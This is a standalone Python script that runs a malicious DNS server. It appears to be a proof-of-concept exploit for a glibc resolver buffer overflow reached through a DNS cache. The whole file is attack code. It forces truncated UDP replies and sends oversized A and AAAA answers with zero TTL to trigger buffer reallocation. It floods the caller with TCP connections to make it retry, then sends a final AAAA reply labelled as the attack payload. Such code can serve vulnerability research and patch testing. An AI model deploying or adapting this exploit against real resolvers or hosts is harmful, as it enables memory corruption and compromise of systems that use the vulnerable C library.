#!/usr/bin/env python3

import socket
import struct
import threading
import time

HOST=""
PORT=53

DNS_FLAG_QR = 0x8000
DNS_FLAG_AA = 0x0400
DNS_FLAG_TC = 0x0200
DNS_FLAG_RD = 0x0100
DNS_FLAG_RA = 0x0080


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)

def db(v):
    return struct.pack("!B", v)


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    while True:
        data, addr = sock.recvfrom(1024)
        print("[UDP] Datagram from {0} ({1} bytes)".format(addr[0], len(data)))

        # Parse DNS request header
        trans_id, flags, num_questions, num_answers, num_authorities, num_additional = struct.unpack("!HHHHHH", data[:12])

        # Extract question from payload
        question = data[12:]
        index = 0

        while question[index] != "\x00":
            index += ord(question[index]) + 1

        question = question[:index + 5]

        # Send back response with TC flag set to force transition to TCP
        flags = DNS_FLAG_QR | DNS_FLAG_TC | DNS_FLAG_RD | DNS_FLAG_RA

        data  = dw(trans_id)    # Transaction ID
        data += dw(flags)       # Flags
        data += dw(1)           # Number of questions
        data += dw(0)           # Number of answer RRs
        data += dw(0)           # Number of authoritative RRs
        data += dw(0)           # Number of additional RRs
        data += question

        sock.sendto(data, addr)


def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    attack_stage = {}

    while True:
        conn, addr = sock.accept()
        print("[TCP] Connection from {0}".format(addr[0]))

        while True:
            # Read request length
            try:
                querylen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(querylen)
            except:
                print("[TCP] Disconnected")
                break

            # Parse DNS request header
            trans_id, flags, num_questions, num_answers, num_authorities, num_additional = struct.unpack("!HHHHHH", data[:12])

            # Extract question from payload
            question = data[12:]
            index = 0

            while question[index] != "\x00":
                index += ord(question[index]) + 1

            question = question[:index + 5]

            # Execute attack phases
            label = (addr[0], addr[1], trans_id)

            if label in attack_stage:
                attack_stage[label] += 1
            else:
                attack_stage[label] = 1

            stage = attack_stage[label]
            data = None

            # Stage 1: Send oversized type A answer with TTL=0 to force DNS cache to send truncated UDP reply to glibc client
            if stage == 1:
                print("[TCP] Stage 1: Sending type A reply with TTL=0 and > 512 bytes")
                flags = DNS_FLAG_QR | DNS_FLAG_RD | DNS_FLAG_RA
                data  = dw(trans_id)        # Transaction ID
                data += dw(flags)           # Flags
                data += dw(1)               # Number of questions
                data += dw(127)             # Number of response RRs
                data += dw(0)               # Number of authoritative RRs
                data += dw(0)               # Number of additional RRs
                data += question

                # Append A records to answer section
                for rec in range(127):
                    answer  = dw(0xc00c)    # Compressed name
                    answer += dw(1)         # Type
                    answer += dw(1)         # Class
                    answer += dd(0)         # TTL
                    answer += dw(4)         # Data length
                    answer += chr(rec) * 4  # Data
                    data += answer

            # Stage 2: Send oversized type AAAA answer with TTL=0 to force DNS cache to send truncated UDP reply to glibc client
            if stage == 2:
                print("[TCP] Stage 2: Sending type AAAA reply with TTL=0 and > 512 bytes")
                flags = DNS_FLAG_QR | DNS_FLAG_RD | DNS_FLAG_RA
                data  = dw(trans_id)        # Transaction ID
                data += dw(flags)           # Flags
                data += dw(1)               # Number of questions
                data += dw(127)             # Number of response RRs
                data += dw(0)               # Number of authoritative RRs
                data += dw(0)               # Number of additional RRs
                data += question

                # Append AAAA records to answer section
                for rec in range(127):
                    answer  = dw(0xc00c)    # Compressed name
                    answer += dw(28)        # Type
                    answer += dw(1)         # Class
                    answer += dd(0)         # TTL
                    answer += dw(16)        # Data length
                    answer += chr(rec) * 16 # Data
                    data += answer

            # Stage 3: Send oversized type A answer with TTL=0 to force buffer reallocation on glibc client
            if stage == 3:
                print("[TCP] Stage 3: Sending type A reply with TTL=0 and > 2048 bytes")
                flags = DNS_FLAG_QR | DNS_FLAG_RD | DNS_FLAG_RA
                data  = dw(trans_id)        # Transaction ID
                data += dw(flags)           # Flags
                data += dw(1)               # Number of questions
                data += dw(127)             # Number of response RRs
                data += dw(0)               # Number of authoritative RRs
                data += dw(0)               # Number of additional RRs
                data += question

                # Append A records to answer section
                for rec in range(127):
                    answer  = dw(0xc00c)    # Compressed name
                    answer += dw(1)         # Type
                    answer += dw(1)         # Class
                    answer += dd(0)         # TTL
                    answer += dw(4)         # Data length
                    answer += chr(rec) * 4  # Data
                    data += answer

            # Stage 4: Force DNS cache to drop the client's connection so that the glibc client needs to retry both requests
            if stage == 4:
                print("[TCP] Stage 4: Spawning TCP connections back to caller")
                conn.setblocking(False)
                socklist = []

                while True:
                    try:
                        for i in range(20):
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((addr[0], 53))
                            s.send(struct.pack("!H", 35))
                            s.setblocking(False)
                            socklist.append(s)
                    except:
                        pass

                    try:
                        conn.recv(1)
                    except:
                        print("[TCP] Stage 4: Original connection terminated")
                        break

            # Stage 5: Send valid type A answer
            if stage == 5:
                print("[TCP] Stage 5: Sending valid type A reply")
                flags = DNS_FLAG_QR | DNS_FLAG_RD | DNS_FLAG_RA
                data  = dw(trans_id)        # Transaction ID
                data += dw(flags)           # Flags
                data += dw(1)               # Number of questions
                data += dw(0)               # Number of response RRs
                data += dw(0)               # Number of authoritative RRs
                data += dw(0)               # Number of additional RRs
                data += question

            # Stage 6: Send type AAAA answer containing attack payload
            if stage == 6:
                print("[TCP] Stage 6: Sending attack payload in type AAAA reply")
                flags = DNS_FLAG_QR | DNS_FLAG_RD | DNS_FLAG_RA
                data  = dw(trans_id)        # Transaction ID
                data += dw(flags)           # Flags
                data += dw(1)               # Number of questions
                data += dw(127)             # Number of response RRs
                data += dw(0)               # Number of authoritative RRs
                data += dw(0)               # Number of additonal RRs
                data += question

                # Add AAAA records to answer section
                for rec in range(127):
                    answer  = dw(0xc00c)    # Compressed name
                    answer += dw(28)        # Type
                    answer += dw(1)         # Class
                    answer += dd(0)         # TTL
                    answer += dw(16)        # Data length
                    answer += chr(rec) * 16 # Data
                    data += answer

            # Send the data
            if data:
                conn.sendall(dw(len(data)) + data)


if __name__ == "__main__":

    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            print("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            print("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.start()

        time.sleep(5)

